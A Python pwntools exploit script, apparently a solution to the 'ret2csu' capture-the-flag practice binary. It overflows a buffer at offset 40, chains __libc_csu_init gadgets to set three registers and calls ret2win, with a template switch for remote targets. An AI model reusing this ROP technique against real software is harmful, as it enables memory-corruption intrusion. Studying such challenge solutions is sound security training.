from pprint import pprint
from typing import Tuple

from pwn import *

HOST = ""
PORT = ""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


FIRST_POPPER = 0x40069A  # <__libc_csu_init+90>:       pop    rbx
SECOND_POPPER = 0x400680  # <__libc_csu_init+64>:       mov    rdx,r15


def ret2csu(
    call_func,
    rdi=0,
    rsi=0,
    rdx=0,
    rbx=0,
    rbp=1,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
):
    # First __libc_csu_init POPPER rbx, rbp, r12, r13, r14, r15
    payload = p64(FIRST_POPPER)
    payload += p64(rbx)  # Fill rbx with 0
    payload += p64(rbp)  # Set RBP to 1 to pass CMP
    payload += p64(call_func)  # call _init to padding the stack
    payload += p64(rdi)  # RDI
    payload += p64(rsi)  # RSI
    payload += p64(rdx)  # RDX
    # Second __libc_csu_init MOV rdx, rsi, edi
    payload += p64(SECOND_POPPER)
    payload += p64(0)  # Padding rsp+8
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    return payload


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *_init
b *__libc_csu_init+90
""".format(
    **locals()
)

# Binary filename
exe = "./ret2csu"
# exe = "./ret2csu32"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"
context.terminal = "tmux splitw -h".split(" ")
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")
libret2csu = ELF("./libret2csu.so", checksec=False)
ARGUMENT = [0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D]

POP_RDI = 0x00000000004006A3  # pop rdi ; ret
INIT_IN_DYNAMIC = 0x600E38
RET2WIN = elf.plt["ret2win"]

pprint(elf.plt)


# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

# Build the payload

# 64
# rop = ROP(elf)

payload = flat(
    {
        offset: [
            ret2csu(INIT_IN_DYNAMIC, ARGUMENT[0], ARGUMENT[1], ARGUMENT[2]),
            POP_RDI,
            ARGUMENT[0],
            RET2WIN,
        ]
    }
)

io.sendafter(b"> ", payload)


# Got Shell?
io.interactive()
